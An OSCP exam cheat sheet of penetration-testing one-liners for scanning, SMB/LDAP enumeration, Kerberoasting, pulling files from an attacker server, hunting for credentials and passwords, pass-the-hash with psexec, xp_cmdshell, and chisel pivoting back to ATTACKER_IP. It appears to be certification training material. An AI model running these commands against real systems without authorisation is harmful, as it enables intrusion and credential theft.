# One-Liners

## Purpose

Fast copy/paste commands for OSCP+ operations.

Core rules:
- No payloads here (see reverse_shells.md)
- Fast execution > completeness
- Use this under pressure
- If one fails → move immediately

---

# 1. LISTENERS

## Netcat

```bash
nc -lvnp <PORT>
```

## RLWrap Netcat

```bash
rlwrap nc -lvnp <PORT>
```

---

# 2. FILE TRANSFER

## Attacker HTTP server

```bash
python3 -m http.server 8000
```

## Linux download

```bash
wget http://<IP>:8000/file
curl http://<IP>:8000/file -o file
```

## Windows download

```cmd
certutil -urlcache -split -f http://<IP>:8000/file file
```

```powershell
(New-Object Net.WebClient).DownloadFile('http://<IP>:8000/file','file')
```

## SMB server

```bash
impacket-smbserver share . -smb2support
```

## SMB copy (Windows)

```cmd
copy \\<IP>\share\file file
```

## SCP

```bash
scp file user@<IP>:/tmp/
scp user@<IP>:/path/to/file .
```

---

# 3. BASE64 FALLBACK

```bash
base64 file > file.b64
base64 -d file.b64 > file
```

```cmd
certutil -decode file.b64 file
```

---

# 4. NETCAT FILE TRANSFER

```bash
nc -lvnp 9001 > file
nc <IP> 9001 < file
```

---

# 5. NMAP

```bash
nmap -p- --min-rate 1000 -T4 <target>
nmap -p <ports> -sC -sV <target>
nmap -sU --top-ports 20 <target>
```

## Pivoted

```bash
proxychains nmap -sT -Pn <target>
```

---

# 6. WEB ENUM

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
dirsearch -u http://<IP>
ffuf -u http://<IP>/FUZZ -w wordlist.txt
whatweb http://<IP>
curl -I http://<IP>
```

---

# 7. SMB ENUM

```bash
smbclient -L //<IP> -N
enum4linux -a <IP>
crackmapexec smb <IP> --shares
crackmapexec smb <IP> --users
smbclient //<IP>/share -U user
```

---

# 8. LDAP / AD

```bash
ldapsearch -x -H ldap://<IP> -s base namingcontexts
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local"
```

```bash
bloodhound-python -u user -p pass -ns <DC_IP> -d domain.local -c All
```

```bash
GetNPUsers.py DOMAIN.LOCAL/ -dc-ip <DC_IP> -usersfile users.txt -no-pass
GetUserSPNs.py DOMAIN.LOCAL/user:pass -dc-ip <DC_IP> -request
```

---

# 9. FTP / NFS / SNMP

```bash
ftp <IP>
showmount -e <IP>
mount -t nfs <IP>:/share /mnt/nfs
snmpwalk -v2c -c public <IP>
snmp-check <IP> -c public
```

---

# 10. ACCESS

## SSH

```bash
ssh user@<IP>
ssh -i id_rsa user@<IP>
```

## WinRM

```bash
evil-winrm -i <IP> -u user -p pass
```

## RDP

```bash
xfreerdp /u:user /p:pass /v:<IP>
```

---

# 11. MSSQL

```bash
mssqlclient.py DOMAIN/user:pass@<IP>
```

```sql
EXEC xp_cmdshell 'whoami';
```

---

# 12. LINUX QUICK ENUM

```bash
id
sudo -l
```

```bash
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
```

```bash
ps aux
netstat -tulnp
```

```bash
grep -Ri "password" / 2>/dev/null
find / -name "id_rsa" 2>/dev/null
```

---

# 13. WINDOWS QUICK ENUM

```cmd
whoami
whoami /groups
whoami /priv
```

```cmd
systeminfo
hostname
ipconfig /all
```

```cmd
sc query state= all
wmic service get name,displayname,pathname,startmode
```

```cmd
schtasks /query /fo LIST /v
cmdkey /list
```

```cmd
findstr /S /I password *.txt *.ini *.config *.xml
```

---

# 14. HASH / CREDENTIAL USE

```bash
crackmapexec smb <IP> -u user -p pass
crackmapexec winrm <IP> -u user -p pass
crackmapexec ldap <IP> -u user -p pass -d DOMAIN
```

```bash
psexec.py DOMAIN/user@<IP> -hashes <LM:NT>
```

---

# 15. PIVOTING

## Chisel

```bash
./chisel server -p 8000 --reverse
chisel.exe client <ATTACKER_IP>:8000 R:socks
```

## Ligolo

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.0.0/24 dev ligolo
```

## SSH SOCKS

```bash
ssh -D 1080 user@<pivot_host>
```

## Proxychains

```bash
proxychains nmap -sT -Pn <target>
```

---

# 16. GOLDEN RULES

- This file = execution speed
- No payloads here
- If something fails → switch fast
- Use dedicated files for deeper techniques